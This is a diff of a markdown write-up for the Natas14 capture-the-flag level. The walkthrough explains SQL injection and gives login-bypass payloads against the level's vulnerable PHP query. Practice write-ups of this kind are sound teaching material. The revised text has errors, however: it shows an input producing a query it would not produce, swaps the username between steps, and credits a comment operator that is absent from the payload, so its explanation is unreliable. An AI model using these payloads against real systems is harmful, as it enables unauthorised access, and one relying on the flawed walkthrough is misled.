@@ -1,37 +1,75 @@
 # 🔐 Natas14 Walkthrough
 
-Here we have a login window. This suggests to us that sql injection will be used here.
+We’re presented with a login form. This hints that **SQL Injection** might be the intended path forward.
 
-## What is sql injection?
-Sql injection is a technique to enter a database. Basic sql injection technique's use `"` as their **weapon.** Let's take a look at an example:
+## 💡 What is SQL Injection?
 
-```
-SELECT * from databaseTableOfUsers where username = "$userProvidedUsername" and password = "$userProvidedPassword"
-```
+SQL Injection is a technique used to manipulate a website’s database through its input fields. 
 
-We can use `"` in our password and username inputs to our advantage. For example:
-
-Input:
-```
-username = something
-password = lol" or "1
-```
-How it will look in the script once we input it:
-```
-SELECT * from databaseTableOfUsers where username = "something" and password = "lol" or "1"
-```
-As you can see the password checking logic now has an ***always true value*** `1` = always true. So the password will be given to us.
-As always, let's check whats under the [View sourcecode](http://natas14.natas.labs.overthewire.org/index-source.html) link. And look for a vunerability like that in the code.
-From the sourcecode we can deduct that the `php` script look for usernames and passwords in a database:
+#### Example
+Imagine a login system with a SQL query like this:
 
 ```php
-$link = mysqli_connect('localhost', 'natas14', '<censored>');
-    mysqli_select_db($link, 'natas14');
+SELECT * FROM users WHERE username = "$username" AND password = "$password";
+```
+Now suppose the attacker enters the following credentials:
+
+```
+username: admin 
+password: password" OR "1 --
 ```
 
-The next line is what interests us:
+The query becomes:
 
+```php
+SELECT * FROM users WHERE username = "admin" AND password = "" OR 1=1 --";
+```
+
+Let's break it down:
+- `""` closes the empty password string.
+- `OR 1=1` always returns true.
+- `--` comments out the rest of the query. (can be useful if you're not sure of the whole output but doesnt have to be used as you'll see in this level.)
+
+So the final condition becomes:
+
+```
+username = "admin" AND (false) OR (true)
+```
+Which effectively bypasses the password check and logs in as `admin`.
+
+
+## ✅ Exploit
+
+Now, let’s check the source code for Natas14 at [View sourcecode](http://natas14.natas.labs.overthewire.org/index-source.html)
+
+From the source, we see the following PHP code:
+```php
+$link = mysqli_connect('localhost', 'natas14', '<censored>');
+mysqli_select_db($link, 'natas14');
+```
+Which indicates that the passwords and usernames are taken from a database.
+
+Here’s the vulnerable part:
 ```php
 $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
 ```
-It look exactly like that previous example. The backticks can look complicated but its actually exactly the same code!
+This is exactly the kind of vulnerable query we discussed earlier. It takes raw user input and inserts it directly into the SQL query without sanitization. That means **SQL Injection is possible**. Let's get rid of the `\` backticks so that the code is clearer:
+```php 
+SELECT * from databaseTableOfUsers where username = "$userProvidedUsername" and password = "$userProvidedPassword"
+```
+As you can see this is almost **exactly** our example.
+
+Let's try the exact same credentials as in the example:
+
+```
+username: admin
+password: lol" OR "1 
+```
+
+Resulting SQL query:
+```php
+SELECT * FROM users WHERE username="something" AND password="lol" OR "1";
+```
+The is a SQL comment operator, which means the rest of the query is ignored — effectively skipping the password check.
+
+If successful, you’ll be logged in and shown the password for **Natas15**! :}
